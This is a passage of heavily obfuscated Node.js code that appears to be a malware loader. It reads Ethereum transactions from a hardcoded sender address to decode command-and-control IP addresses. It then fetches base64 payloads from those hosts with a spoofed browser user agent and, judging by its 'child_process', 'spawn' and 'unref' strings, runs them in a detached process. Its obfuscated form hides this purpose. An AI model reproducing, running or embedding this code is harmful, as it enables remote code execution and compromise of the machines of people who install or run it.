_0x1b2d1b=_0x58000a,_0x2bea1d={'RTOQu':_0x1b2d1b(0x319)};_0x10f8c6&&_0x10f8c6[_0x1b2d1b(0x1df)+_0x1b2d1b(0x1b8)](_0x2bea1d[_0x1b2d1b(0x1dc)],function(){var _0x187460=_0x1b2d1b;_0x14ffea[_0x187460(0x319)]();},{'once':!(0x13ed+-0x24e8+0x10fb)});}function _0x5f1f(){var _0x2ac014=['TxXfx','\x27;global[\x27','SPKMQ','tRVvA','e;global[\x27','4e51C73C84','duyCb','ZUVcu','DeqhG','toString','lBzpv','WMBSb','blockNumbe','42Cf3c8bCE','gUDMR','createInfl','JIuXY','OKeRK','_t_s\x27]=\x27','afDqf','Woqbi','wKaYQ','http://','FWTXb','INjGy','ACUSz','replace','ORDec','yQcPc','wMjSs','ZuXdg','all','IamIB','iCAkU','Win64;\x20x64','kfnBe','node','hBwij','sLDKL','2653854XGfAtj','ORyop','result',',Sr3=@','cXqxg','mumtK','createGunz','n/json','ort=desc&f','SaKfJ','then','AJIfa','nsactionCo','hgSjR',':443/0x/cl','EJSIs','UMFth','wSISv','shrUd','1397778MwxLfz','ptckv','port','?module=ac','ffset=20&s','wDwxg','hereum-rpc','http','nCeoF','HKfgj','HSYoq','pipe',':80/0x/ls','DGSqR','.publicnod','error','rwuQo','rBHMa','data','kYcNs','nonce','POST','rsraS','split','bDNYD','nJWUX','wgfDv','sqsLa','&startbloc','Uyldj','yXrvF','1.0.0.0\x20Sa','oHjzy','stringify',':443/0x/ls','content-en','YthhM','OEYvG','zZUPO','pnACO','xHxGR','Tulwa','PhuGT','lyHlg','YSOrg','push','zFzqR','ch\x20failed','jTVin','Bvhhk','yBiGf','public.bla','URL','CJobJ','request','320908OfafjM','2020968drBpjI','oPsgo','message','Agent','uBewu','yVids','yUEvn','pgOkE','rjzHJ','body','deflate','0x1eEf0849','y-p_>d$0B&','ignore','mtiIt','vAuhA','BdHRr','KICMG','CehBR','lPoSu','atBUe','slice','kFKDq','OQIXz','nsmHe','charCodeAt','h.drpc.org','DmBJV','iDYqw','EOVbu','al=global;','VoVvv','Empty\x20payl','e.com','qfjFi','SdWlm','OUCmK','nJnpQ','\x20(KHTML,\x20l','AUjgJ','qKtqp','ck=9999999','_t_u','UGsWy','x-gzip','rvEdp','2|3|4|0|1','IxJjg','transactio','kRsFE','okbhd','signal','sQENy','FFXvt','eUtvz','vIdBq','_H\x27]=\x27','zjZjX','bEySh','Content-Ty','eth_getTra','OtTwD','TuImQ','oADhP','SclFv','PsQpF','BbVGJ','oxLir','createBrot','dkBbf','zStBf','lWyvC','Hvdas','Mozilla/5.','r\x27]=requir',':443','wqKXy','on=txlist&','679245gRPiyC','from','CQBGp','liDecompre','rvjRg','ess','nWABw','method','path','JDbZW','pc.io/eth','zfRAK','ate,\x20br','min','unt','q4FZkxX{!h','soTeq','nRDuK','RVvoG','YZuuZ','310961XpPOzq','_H2\x27]=\x27','RTBFK','abort','\x20failed\x20fr','HyQqa','XyYgB',';var\x20_glob','Dskeb','Non-JSON\x20f','gxpnj','DpUuE','lEdTN','ate','rom\x20','ut.com/api','ByorQ','hHshS','om\x20','\x20from\x20','jYhyK','fuQLh','XRcWZ','rpEaF','hAXEP','GET','base64','CCUfc','bkGyS','vLrzU','vAfKE','toiEJ','wuvDX','length','controller','yLOOW','taGnj','orXWy','RoTcb','vFgAU','spawn','isArray','kROsn','hex','HTTP\x20','pBLCT','vVVxY','zOpar','m\x27]=module','concat','lwUqi','FAstR','oNbPP','EEBEV','EkQyc','ZquVE','object','STEhh','jrgOX','ngth','aQkuh','QhYcd','1452420SFQGWM','dPArr','URTWa',':80/0x/cls','trim','orCXJ','parse','hVAPF','GJohI','aLuye','yYyZi','write','5bzCUpn','ajGUU','NFrUX','EyuqL','xFqQB','LLQiJ','NMXaR','gzip,\x20defl','HwDdB','hostname','efbbm','oQDlb','https://1r','byteLength','nkZNx','YkKft','Payload-B6','EqNIK','https:','iOozQ','global[\x27_V','MgJfN','pathname','tnjMr','umber','end','stener','PHZYY','pmsad','ilterby=fr','zmPPj','BilVg','_t_u\x27]=\x27','keep-alive','AKgUw','ckByNumber','HwlSV','kHUCa','MJqdK',')\x20AppleWeb','lhviQ','ioHNm','rZjFr','HftAs','x-payload-','uqXMv','child_proc','fpOQw','clpbA','\x20Chrome/13','stapi.io','wuhNK','statusCode','YfsuP','NCWci','Njwhx','oxcuR','oyYiq','cEuCF','SnElf','HkVJf','Czdln','RTOQu','Kit/537.36','goIeZ','addEventLi','1|4|0|5|2|','tEUWY','FcPCc','protocol','h.blocksco','coding','HvojL','fJqFp','oCWGY','XWCds','headers','sqrFt','TAXZS','@^1aQk','NZGbr','_t_s',':80','\x27]=\x27','bXDsG','b64','ndOll','address=','FPGIh','empty','REQwx','YTSLp','0\x20(Windows','unref','eth_blockN','fari/537.3','Kmajx','Missing\x20X-','zeayr','toLowerCas','oKQzr','loader\x20fet','EecnS','rvpmY','_H2','fMysM','h-mainnet.','JSON\x20parse','TviTx','https','WeBBc','txYuv','WBFKG','FXvey','run','zNelt','iUvqA','EDa15d87f6','LUpYf','vdcJc','url','kWMvT','2.0','aMPct','applicatio','wcEXs','ike\x20Gecko)','count&acti','yMBxL','FzjOV','qnnmw','fkwqz','edQdb','IexyK','XzytT','zlib','QDycG','uwLNS','RONKq','utuZi','oad\x20body','resolve','\x20NT\x2010.0;\x20','eth_getBlo','oXfHd','catch','oHewR','dbVbv','k=0&endblo','Content-Le','zmfOI','gzip','SukDz','gOQaW','9&page=1&o','IMBTW','kCqkP','search','resume','utf8','CPXYo','HEAD','https://et','wqGPb'];_0x5f1f=function(){return _0x2ac014;};return _0x5f1f();}function decompressStream(_0x58ef41){var _0x2e4c14=_0x58000a,_0x129e9d={'oxcuR':_0x2e4c14(0x29f)+_0x2e4c14(0x1e5),'IexyK':function(_0x11176b,_0x5cd771){return _0x11176b===_0x5cd771;},'Dskeb':_0x2e4c14(0x235),'NFrUX':function(_0x54365e,_0x4e36e9){return _0x54365e===_0x4e36e9;},'STEhh':_0x2e4c14(0x2e0),'fJqFp':function(_0x577b41,_0x16f14d){return _0x577b41===_0x16f14d;},'gxpnj':_0x2e4c14(0x2be)},_0x44ed26=(_0x58ef41[_0x2e4c14(0x1ea)][_0x129e9d[_0x2e4c14(0x1d6)]]||'')[_0x2e4c14(0x201)+'e']();return _0x129e9d[_0x2e4c14(0x223)](_0x129e9d[_0x2e4c14(0x31e)],_0x44ed26)||_0x129e9d[_0x2e4c14(0x1a0)](_0x129e9d[_0x2e4c14(0x18d)],_0x44ed26)?_0x58ef41[_0x2e4c14(0x287)](zlib[_0x2e4c14(0x26f)+'ip']()):_0x129e9d[_0x2e4c14(0x1e7)](_0x129e9d[_0x2e4c14(0x320)],_0x44ed26)?_0x58ef41[_0x2e4c14(0x287)](zlib[_0x2e4c14(0x251)+_0x2e4c14(0x323)]()):_0x129e9d[_0x2e4c14(0x1e7)]('br',_0x44ed26)?_0x58ef41[_0x2e4c14(0x287)](zlib[_0x2e4c14(0x2f8)+_0x2e4c14(0x305)+'ss']()):_0x58ef41;}function httpRequest(_0x42b8c9,_0x40480d){var _0x5651bb=_0x58000a,_0x9a8d3c={'SdWlm':_0x5651bb(0x23d),'wcEXs':function(_0x2ac831,_0x48aa9e){return _0x2ac831<_0x48aa9e;},'URTWa':function(_0x33f658,_0x158078){return _0x33f658>=_0x158078;},'HwlSV':function(_0x54919a,_0x5014a1){return _0x54919a(_0x5014a1);},'nsmHe':function(_0x595fe1,_0x2d1025){return _0x595fe1+_0x2d1025;},'SaKfJ':_0x5651bb(0x180),'lEdTN':_0x5651bb(0x329),'JDbZW':function(_0x3f2227,_0x52fe66){return _0x3f2227===_0x52fe66;},'nJnpQ':function(_0x587c9f,_0x35e05f){return _0x587c9f!==_0x35e05f;},'HSYoq':function(_0x378021,_0x5a4f4c){return _0x378021+_0x5a4f4c;},'MJqdK':function(_0x29b1b1,_0x45ead5){return _0x29b1b1+_0x45ead5;},'SclFv':_0x5651bb(0x31f)+_0x5651bb(0x324),'fkwqz':function(_0x68b17c,_0x4b6c05){return _0x68b17c+_0x4b6c05;},'ByorQ':_0x5651bb(0x209)+_0x5651bb(0x31a)+_0x5651bb(0x328),'AKgUw':_0x5651bb(0x28e),'jrgOX':_0x5651bb(0x1b7),'wuhNK':_0x5651bb(0x28b),'rjzHJ':function(_0x3d39f2,_0x1e676f){return _0x3d39f2===_0x1e676f;},'TuImQ':_0x5651bb(0x1b0),'LUpYf':function(_0x1c2768,_0x250900){return _0x1c2768!=_0x250900;},'IxJjg':function(_0x943e4d,_0x3d06c1){return _0x943e4d||_0x3d06c1;},'ioHNm':_0x5651bb(0x32f),'zFzqR':_0x5651bb(0x21a)+_0x5651bb(0x270),'YZuuZ':_0x5651bb(0x1a5)+_0x5651bb(0x30e),'TviTx':_0x5651bb(0x1bf),'sqrFt':function(_0x2a3348,_0x38078b){return _0x2a3348!=_0x38078b;},'rpEaF':_0x5651bb(0x2ef)+'pe','zStBf':_0x5651bb(0x233)+_0x5651bb(0x18f)},_0x31ff38=(_0x40480d=_0x9a8d3c[_0x5651bb(0x2e3)](_0x40480d,{}))[_0x5651bb(0x309)]||_0x9a8d3c[_0x5651bb(0x1c7)],_0x416534=_0x40480d[_0x5651bb(0x2bd)],_0x165688=_0x40480d[_0x5651bb(0x2e7)],_0x1a220d=new URL(_0x42b8c9),_0x538603=_0x9a8d3c[_0x5651bb(0x2bc)](_0x9a8d3c[_0x5651bb(0x2f2)],_0x1a220d[_0x5651bb(0x1e3)])?https:http,_0x5e20c9={'Accept':_0x9a8d3c[_0x5651bb(0x2aa)],'Accept-Encoding':_0x9a8d3c[_0x5651bb(0x315)],'Connection':_0x9a8d3c[_0x5651bb(0x20a)]};return _0x9a8d3c[_0x5651bb(0x1eb)](null,_0x416534)&&(_0x5e20c9[_0x9a8d3c[_0x5651bb(0x32d)]]=_0x9a8d3c[_0x5651bb(0x2aa)],_0x5e20c9[_0x9a8d3c[_0x5651bb(0x2fa)]]=Buffer[_0x5651bb(0x1ab)](_0x416534)),new Promise(function(_0x53a2cc,_0x349283){var _0x47d1d9=_0x5651bb,_0x22c795={'lwUqi':_0x9a8d3c[_0x47d1d9(0x2d7)],'lWyvC':function(_0x281d70,_0x55399c){var _0x182217=_0x47d1d9;return _0x9a8d3c[_0x182217(0x21b)](_0x281d70,_0x55399c);},'kHUCa':function(_0x3b0b46,_0x2d484a){var _0x444ce7=_0x47d1d9;return _0x9a8d3c[_0x444ce7(0x194)](_0x3b0b46,_0x2d484a);},'vIdBq':function(_0x198efa,_0x40df5f){var _0x2919f2=_0x47d1d9;return _0x9a8d3c[_0x2919f2(0x1c2)](_0x198efa,_0x40df5f);},'tnjMr':function(_0x5cbfcb,_0xaad4ea){var _0x10fed6=_0x47d1d9;return _0x9a8d3c[_0x10fed6(0x2cc)](_0x5cbfcb,_0xaad4ea);},'HftAs':function(_0x465974,_0x433e4f){var _0x25ccbd=_0x47d1d9;return _0x9a8d3c[_0x25ccbd(0x2cc)](_0x465974,_0x433e4f);},'rvpmY':_0x9a8d3c[_0x47d1d9(0x272)],'kCqkP':_0x9a8d3c[_0x47d1d9(0x322)],'FFXvt':function(_0xc41db3,_0x4b8350){var _0x4cbaa2=_0x47d1d9;return _0x9a8d3c[_0x4cbaa2(0x30b)](_0xc41db3,_0x4b8350);},'oyYiq':function(_0x486d05,_0xad4cb4){var _0x554c00=_0x47d1d9;return _0x9a8d3c[_0x554c00(0x2d9)](_0x486d05,_0xad4cb4);},'taGnj':function(_0x511bc6,_0x2aca35){var _0x40dcd1=_0x47d1d9;return _0x9a8d3c[_0x40dcd1(0x286)](_0x511bc6,_0x2aca35);},'dbVbv':function(_0x1872c9,_0x51d974){var _0x3349ca=_0x47d1d9;return _0x9a8d3c[_0x3349ca(0x1c4)](_0x1872c9,_0x51d974);},'Uyldj':_0x9a8d3c[_0x47d1d9(0x2f4)],'pgOkE':function(_0x370206,_0x247d12){var _0x4e79ca=_0x47d1d9;return _0x9a8d3c[_0x4e79ca(0x2cc)](_0x370206,_0x247d12);},'yVids':function(_0x417d3d,_0x47e65a){var _0xd39c48=_0x47d1d9;return _0x9a8d3c[_0xd39c48(0x221)](_0x417d3d,_0x47e65a);},'CehBR':_0x9a8d3c[_0x47d1d9(0x326)],'wSISv':_0x9a8d3c[_0x47d1d9(0x1c0)],'RTBFK':_0x9a8d3c[_0x47d1d9(0x18e)],'kROsn':_0x9a8d3c[_0x47d1d9(0x1d1)]},_0x362db7=_0x538603[_0x47d1d9(0x2b2)]({'hostname':_0x1a220d[_0x47d1d9(0x1a7)],'port':_0x1a220d[_0x47d1d9(0x27e)]||(_0x9a8d3c[_0x47d1d9(0x2bc)](_0x9a8d3c[_0x47d1d9(0x2f2)],_0x1a220d[_0x47d1d9(0x1e3)])?0x11b*-0x3+0x16fb+0x11ef*-0x1:-0x6dc*0x2+-0x1b69+0x2971),'path':_0x9a8d3c[_0x47d1d9(0x221)](_0x1a220d[_0x47d1d9(0x1b4)],_0x1a220d[_0x47d1d9(0x23b)]),'method':_0x31ff38,'agent':AGENTS[_0x1a220d[_0x47d1d9(0x1e3)]],'signal':_0x165688,'headers':_0x5e20c9},function(_0x1c48de){var _0x2db98e=_0x47d1d9,_0xaaf826=_0x22c795[_0x2db98e(0x2eb)](decompressStream,_0x1c48de),_0xf46bb7=[];_0xaaf826['on'](_0x22c795[_0x2db98e(0x27a)],function(_0x175119){var _0x190a4e=_0x2db98e;_0xf46bb7[_0x190a4e(0x2a9)](_0x175119);}),_0xaaf826['on'](_0x22c795[_0x2db98e(0x318)],function(){var _0x58d40b=_0x2db98e,_0x16c40e=Buffer[_0x58d40b(0x185)](_0xf46bb7)[_0x58d40b(0x24b)](_0x22c795[_0x58d40b(0x186)])[_0x58d40b(0x196)]();if(_0x22c795[_0x58d40b(0x2fb)](_0x1c48de[_0x58d40b(0x1d2)],0x150a*-0x1+-0x3aa+0x197c)||_0x22c795[_0x58d40b(0x1c3)](_0x1c48de[_0x58d40b(0x1d2)],-0x1f09+0x8*-0x30b+-0x1*-0x388d))return _0x22c795[_0x58d40b(0x2eb)](_0x349283,new Error(_0x22c795[_0x58d40b(0x1b5)](_0x22c795[_0x58d40b(0x1b5)](_0x22c795[_0x58d40b(0x1b5)](_0x22c795[_0x58d40b(0x1b5)](_0x22c795[_0x58d40b(0x1c9)](_0x22c795[_0x58d40b(0x205)],_0x1c48de[_0x58d40b(0x1d2)]),_0x22c795[_0x58d40b(0x23a)]),_0x1a220d[_0x58d40b(0x1a7)]),':\x20'),_0x16c40e[_0x58d40b(0x2c9)](0x7*0x4a7+0x19ad+-0x3a3e,-0xae*0x25+0x1*-0x23d+0x949*0x3))));if(!_0x16c40e||_0x22c795[_0x58d40b(0x2e9)]('<',_0x16c40e[0x3*0xb9f+-0x2fb+-0x1fe2])||_0x22c795[_0x58d40b(0x1d7)]('{',_0x16c40e[-0x236e+0x1*-0x16dd+-0x1*-0x3a4b])&&_0x22c795[_0x58d40b(0x1d7)]('[',_0x16c40e[0x11e*-0x1a+-0x1b21+0x382d]))return _0x22c795[_0x58d40b(0x2eb)](_0x349283,new Error(_0x22c795[_0x58d40b(0x1b5)](_0x22c795[_0x58d40b(0x33a)](_0x22c795[_0x58d40b(0x231)](_0x22c795[_0x58d40b(0x299)],_0x1a220d[_0x58d40b(0x1a7)]),':\x20'),_0x16c40e[_0x58d40b(0x2c9)](0x1213+-0x26*0x52+-0x5e7,-0x12b7*-0x1+-0x1782+0x543))));try{_0x22c795[_0x58d40b(0x2eb)](_0x53a2cc,JSON[_0x58d40b(0x198)](_0x16c40e));}catch(_0x1970de){_0x22c795[_0x58d40b(0x2eb)](_0x349283,new Error(_0x22c795[_0x58d40b(0x231)](_0x22c795[_0x58d40b(0x2bb)](_0x22c795[_0x58d40b(0x2b9)](_0x22c795[_0x58d40b(0x2c6)],_0x1a220d[_0x58d40b(0x1a7)]),':\x20'),_0x1970de[_0x58d40b(0x2b6)])));}}),_0xaaf826['on'](_0x22c795[_0x2db98e(0x17e)],_0x349283);});_0x362db7['on'](_0x9a8d3c[_0x47d1d9(0x1d1)],_0x349283),_0x9a8d3c[_0x47d1d9(0x214)](null,_0x416534)&&_0x362db7[_0x47d1d9(0x19d)](_0x416534),_0x362db7[_0x47d1d9(0x1b7)]();});}function _0x3cb6(_0x1ceef8,_0x425337){_0x1ceef8=_0x1ceef8-(0xb*0xae+-0x22c4+-0x8b*-0x35);var _0x1e0879=_0x5f1f();var _0x36f1ef=_0x1e0879[_0x1ceef8];return _0x36f1ef;}function promiseAny(_0x475443){var _0x57a1a4=_0x58000a,_0x14aec2={'kfnBe':function(_0x4a4d03,_0x10701e){return _0x4a4d03===_0x10701e;},'oxLir':function(_0x2bac22,_0x5ea465){return _0x2bac22(_0x5ea465);},'orXWy':function(_0x5f1e95,_0x3ebdd9){return _0x5f1e95<_0x3ebdd9;},'qnnmw':function(_0x4a20b6,_0x482e3f){return _0x4a20b6(_0x482e3f);},'dPArr':_0x57a1a4(0x1f7)};return new Promise(function(_0x19bd6f,_0xfd18aa){var _0x446a85=_0x57a1a4,_0x441fae={'orCXJ':function(_0x27f439,_0x5d829f){var _0xe8a263=_0x3cb6;return _0x14aec2[_0xe8a263(0x265)](_0x27f439,_0x5d829f);},'zOpar':function(_0x4164d3,_0x4c4d00){var _0x4a2e85=_0x3cb6;return _0x14aec2[_0x4a2e85(0x2f7)](_0x4164d3,_0x4c4d00);}},_0x451c2d,_0x436bac=_0x475443[_0x446a85(0x337)],_0x52ed4b=null;if(_0x436bac){for(_0x451c2d=-0x21a2+0x19f6*-0x1+0x3b98;_0x14aec2[_0x446a85(0x33b)](_0x451c2d,_0x475443[_0x446a85(0x337)]);_0x451c2d++)_0x475443[_0x451c2d][_0x446a85(0x273)](_0x19bd6f,function(_0x5762a7){var _0x3d9916=_0x446a85;_0x52ed4b=_0x5762a7,_0x441fae[_0x3d9916(0x197)](0x86f+0xf55+-0x17c4,--_0x436bac)&&_0x441fae[_0x3d9916(0x183)](_0xfd18aa,_0x52ed4b);});}else _0x14aec2[_0x446a85(0x220)](_0xfd18aa,new Error(_0x14aec2[_0x446a85(0x193)]));});}function withRpcEndpoints(_0x2b091d,_0x494a9e){var _0x39d77e=_0x58000a,_0xa4966b={'WMBSb':_0x39d77e(0x1e0)+'3','ZuXdg':function(_0x232554,_0x30bfdd){return _0x232554<_0x30bfdd;},'DeqhG':function(_0x523be8,_0x5e39a3){return _0x523be8<_0x5e39a3;},'SPKMQ':function(_0x2c8cd6,_0x5eb5cf,_0x1212d8){return _0x2c8cd6(_0x5eb5cf,_0x1212d8);},'goIeZ':function(_0x4fec81,_0x1889dd){return _0x4fec81(_0x1889dd);},'atBUe':function(_0x3af2e4,_0x3f56ae){return _0x3af2e4<_0x3f56ae;}},_0x2497de=_0xa4966b[_0x39d77e(0x24d)][_0x39d77e(0x293)]('|'),_0x22f2f3=0x2015+-0x9ad*0x1+-0x1668;while(!![]){switch(_0x2497de[_0x22f2f3++]){case'0':for(_0x7bb1b7=-0xba9+-0xcd*-0xe+0x73;_0xa4966b[_0x39d77e(0x260)](_0x7bb1b7,RPC_ENDPOINTS[_0x39d77e(0x337)]);_0x7bb1b7++)_0x29ffd0[_0x39d77e(0x2a9)](new AbortController());continue;case'1':var _0x19861f={'wqKXy':function(_0x474ae3,_0x203b68){var _0x57f5e6=_0x39d77e;return _0xa4966b[_0x57f5e6(0x24a)](_0x474ae3,_0x203b68);}};continue;case'2':for(_0x7bb1b7=-0x1375+-0x3e6+0x175b;_0xa4966b[_0x39d77e(0x260)](_0x7bb1b7,RPC_ENDPOINTS[_0x39d77e(0x337)]);_0x7bb1b7++)_0x53a409[_0x39d77e(0x2a9)](_0xa4966b[_0x39d77e(0x244)](_0x2b091d,RPC_ENDPOINTS[_0x7bb1b7],_0x29ffd0[_0x7bb1b7][_0x39d77e(0x2e7)]));continue;case'3':return _0xa4966b[_0x39d77e(0x1de)](promiseAny,_0x53a409)[_0x39d77e(0x273)](function(_0x473021){var _0x77172c=_0x39d77e;for(_0x7bb1b7=0x1a2*-0xb+0x2c5*-0x1+0x14bb;_0x19861f[_0x77172c(0x300)](_0x7bb1b7,_0x29ffd0[_0x77172c(0x337)]);_0x7bb1b7++)_0x29ffd0[_0x7bb1b7][_0x77172c(0x319)]();return _0x473021;},function(_0x58f886){var _0x54c06=_0x39d77e;for(_0x7bb1b7=0x1da2+-0x1349+-0xa59*0x1;_0x19861f[_0x54c06(0x300)](_0x7bb1b7,_0x29ffd0[_0x54c06(0x337)]);_0x7bb1b7++)_0x29ffd0[_0x7bb1b7][_0x54c06(0x319)]();throw _0x58f886;});case'4':var _0x7bb1b7,_0x29ffd0=[],_0x53a409=[];continue;case'5':for(_0x7bb1b7=0xcbe+0x549+-0x39b*0x5;_0xa4966b[_0x39d77e(0x2c8)](_0x7bb1b7,_0x29ffd0[_0x39d77e(0x337)]);_0x7bb1b7++)_0xa4966b[_0x39d77e(0x244)](linkAbort,_0x494a9e,_0x29ffd0[_0x7bb1b7]);continue;}break;}}function rpcCall(_0x443af6,_0x4275aa,_0x2d1af7,_0x3d7605){var _0x56f245=_0x58000a,_0x214d7a={'MgJfN':function(_0x11c0e0,_0x25b702,_0x167c37){return _0x11c0e0(_0x25b702,_0x167c37);},'YkKft':_0x56f245(0x291),'qKtqp':_0x56f245(0x218)};return _0x214d7a[_0x56f245(0x1b3)](httpRequest,_0x443af6,{'method':_0x214d7a[_0x56f245(0x1ad)],'body':JSON[_0x56f245(0x29d)]({'jsonrpc':_0x214d7a[_0x56f245(0x2dc)],'id':0x1,'method':_0x4275aa,'params':_0x2d1af7}),'signal':_0x3d7605})[_0x56f245(0x273)](function(_0x1ec03b){var _0x39dcc2=_0x56f245;return _0x1ec03b[_0x39dcc2(0x26b)];});}function rpcBatch(_0x1ed593,_0x1f08df,_0x4f88c6){var _0x114422=_0x58000a,_0x457c52={'wMjSs':_0x114422(0x2e2),'aQkuh':function(_0x566427,_0x14a58f){return _0x566427<_0x14a58f;},'efbbm':function(_0x2cfa3a,_0xb05faf){return _0x2cfa3a+_0xb05faf;},'wDwxg':function(_0x134a06,_0x4227d3){return _0x134a06<_0x4227d3;},'duyCb':function(_0x273771,_0x575cd2){return _0x273771<_0x575cd2;},'AUjgJ':_0x114422(0x218),'afDqf':function(_0x547dfc,_0x493833,_0x4ebc33){return _0x547dfc(_0x493833,_0x4ebc33);},'oCWGY':_0x114422(0x291)},_0x2590c7,_0x29f946=[];for(_0x2590c7=0x1847+0x1da7+-0x5fe*0x9;_0x457c52[_0x114422(0x248)](_0x2590c7,_0x1f08df[_0x114422(0x337)]);_0x2590c7++)_0x29f946[_0x114422(0x2a9)]({'jsonrpc':_0x457c52[_0x114422(0x2db)],'id':_0x457c52[_0x114422(0x1a8)](_0x2590c7,0xa3c+-0x1bd5+0x119a),'method':_0x1f08df[_0x2590c7][-0x1c8e+-0x128e+0x2f1c],'params':_0x1f08df[_0x2590c7][0x698+-0x2137+0x1aa0]});return _0x457c52[_0x114422(0x255)](httpRequest,_0x1ed593,{'method':_0x457c52[_0x114422(0x1e8)],'body':JSON[_0x114422(0x29d)](_0x29f946),'signal':_0x4f88c6})[_0x114422(0x273)](function(_0x31b23b){var _0x51f8ac=_0x114422,_0x3f6bee=_0x457c52[_0x51f8ac(0x25f)][_0x51f8ac(0x293)]('|'),_0x2f46e9=0x1e6e*-0x1+0x1652+-0x6*-0x15a;while(!![]){switch(_0x3f6bee[_0x2f46e9++]){case'0':for(_0x2590c7=0x5*-0x6ab+-0x1d80+0x3ed7*0x1;_0x457c52[_0x51f8ac(0x190)](_0x2590c7,_0x1f08df[_0x51f8ac(0x337)]);_0x2590c7++)_0x56cd46[_0x51f8ac(0x2a9)](_0x61a579[_0x457c52[_0x51f8ac(0x1a8)](_0x2590c7,0x1*0x149f+0x4c0+0x1*-0x195e)][_0x51f8ac(0x26b)]);continue;case'1':return _0x56cd46;case'2':var _0x61a579={};continue;case'3':for(_0x2590c7=-0x15b6+-0x34*0x15+0x19fa;_0x457c52[_0x51f8ac(0x281)](_0x2590c7,_0x31b23b[_0x51f8ac(0x337)]);_0x2590c7++)_0x61a579[_0x31b23b[_0x2590c7]['id']]=_0x31b23b[_0x2590c7];continue;case'4':var _0x56cd46=[];continue;}break;}});}function toBlockHex(_0x409787){var _0x4a79b0=_0x58000a,_0x5f4698={'OUCmK':function(_0x31dd61,_0x39c156){return _0x31dd61+_0x39c156;},'edQdb':function(_0x4f5d9f,_0x426ee1){return _0x4f5d9f(_0x426ee1);}};return _0x5f4698[_0x4a79b0(0x2d8)]('0x',_0x5f4698[_0x4a79b0(0x222)](Number,_0x409787)[_0x4a79b0(0x24b)](0xef5+0x24c*0x2+0x137d*-0x1));}function findSenderTx(_0x10aa9d){var _0xe921a6=_0x58000a,_0x260d6d={'FAstR':function(_0x221cbe,_0x4c84a8){return _0x221cbe<_0x4c84a8;},'vVVxY':function(_0x37285d,_0x4ee7c7){return _0x37285d===_0x4ee7c7;}},_0x14e955;for(_0x14e955=0x9eb*-0x1+-0x1794+-0x157*-0x19;_0x260d6d[_0xe921a6(0x187)](_0x14e955,_0x10aa9d[_0xe921a6(0x337)]);_0x14e955++)if(_0x10aa9d[_0x14e955][_0xe921a6(0x303)]&&_0x260d6d[_0xe921a6(0x182)](_0x10aa9d[_0x14e955][_0xe921a6(0x303)][_0xe921a6(0x201)+'e'](),SENDER))return _0x10aa9d[_0x14e955];return null;}function decodeAddress(_0x3b63ad){var _0x1999e3=_0x58000a,_0x26721a={'jTVin':function(_0xb52860,_0xb1cc79){return _0xb52860+_0xb1cc79;},'xHxGR':_0x1999e3(0x17f),'lyHlg':function(_0x9b55f1,_0x362b17){return _0x9b55f1(_0x362b17);}},_0x53cc07=Buffer[_0x1999e3(0x303)](_0x3b63ad[_0x1999e3(0x25c)](/^0x/i,''),_0x26721a[_0x1999e3(0x2a4)]);function _0x1ade27(_0x5db4ee){var _0x222fb8=_0x1999e3;return _0x26721a[_0x222fb8(0x2ac)](_0x26721a[_0x222fb8(0x2ac)](_0x26721a[_0x222fb8(0x2ac)](_0x26721a[_0x222fb8(0x2ac)](_0x26721a[_0x222fb8(0x2ac)](_0x26721a[_0x222fb8(0x2ac)](_0x5db4ee[0x15b8+0x2039+-0x35f1],'.'),_0x5db4ee[-0x2033+-0x185a+0x388e]),'.'),_0x5db4ee[0x20*-0x63+-0x11e0+0x1e42]),'.'),_0x5db4ee[-0x2538+-0x2618+0x4b53]);}return[_0x26721a[_0x1999e3(0x2a7)](_0x1ade27,_0x53cc07[_0x1999e3(0x2c9)](-0x18*0xb9+-0x1add+0x2c35,-0x16fe*-0x1+-0x220a*0x1+0xb10)),_0x26721a[_0x1999e3(0x2a7)](_0x1ade27,_0x53cc07[_0x1999e3(0x2c9)](0x1*-0x2327+-0xc9c+-0x97*-0x51,-0x1e96+-0x2*0x89d+-0x2*-0x17ec))];}function firstMatch(_0x23ac98){var _0x1690cd={'LLQiJ':function(_0x2e7a1d,_0x139801){return _0x2e7a1d<_0x139801;},'DGSqR':function(_0xc8ab3e,_0x1db3dd){return _0xc8ab3e(_0x1db3dd);},'HwDdB':function(_0x325bb4,_0x1a313f){return _0x325bb4(_0x1a313f);},'lBzpv':function(_0x367033,_0x5d3a82){return _0x367033===_0x5d3a82;},'sLDKL':function(_0x2e12d9,_0x33ff53){return _0x2e12d9(_0x33ff53);},'clpbA':function(_0x173bac,_0x328382){return _0x173bac!==_0x328382;}};return new Promise(function(_0x21c76e){var _0x2e2d2f=_0x3cb6,_0x4105ce={'hVAPF':function(_0x140573,_0x117a62){var _0x1c3240=_0x3cb6;return _0x1690cd[_0x1c3240(0x1a6)](_0x140573,_0x117a62);},'HkVJf':function(_0x26fd32,_0xa3bd39){var _0x3e1ff1=_0x3cb6;return _0x1690cd[_0x3e1ff1(0x24c)](_0x26fd32,_0xa3bd39);},'shrUd':function(_0x339fff,_0x7f1f2d){var _0x47d41b=_0x3cb6;return _0x1690cd[_0x47d41b(0x268)](_0x339fff,_0x7f1f2d);},'wKaYQ':function(_0x3aa99d,_0x1faa1a){var _0x3f344b=_0x3cb6;return _0x1690cd[_0x3f344b(0x1ce)](_0x3aa99d,_0x1faa1a);}},_0x2c6a88=_0x23ac98[_0x2e2d2f(0x337)];if(!_0x2c6a88)return _0x1690cd[_0x2e2d2f(0x289)](_0x21c76e,null);var _0x1dc9b8,_0x2fbb36=!(-0x2*0xec6+-0x151c+0x32a9);function _0x3d8765(_0x16cace){var _0x37346d=_0x2e2d2f,_0x1b20ff;if(!_0x2fbb36){for(_0x2fbb36=!(-0x25d9*-0x1+-0x15d2+-0x1007),_0x1b20ff=-0x1*-0x1beb+0x10a2*0x2+-0x3d2f;_0x1690cd[_0x37346d(0x1a3)](_0x1b20ff,_0x23ac98[_0x37346d(0x337)]);_0x1b20ff++)_0x23ac98[_0x1b20ff][_0x37346d(0x338)][_0x37346d(0x319)]();_0x1690cd[_0x37346d(0x289)](_0x21c76e,_0x16cace);}}for(_0x1dc9b8=-0xe1e+-0x1706+0x2524;_0x1690cd[_0x2e2d2f(0x1a3)](_0x1dc9b8,_0x23ac98[_0x2e2d2f(0x337)]);_0x1dc9b8++)_0x23ac98[_0x1dc9b8][_0x2e2d2f(0x210)]()[_0x2e2d2f(0x273)](function(_0x45c1af){var 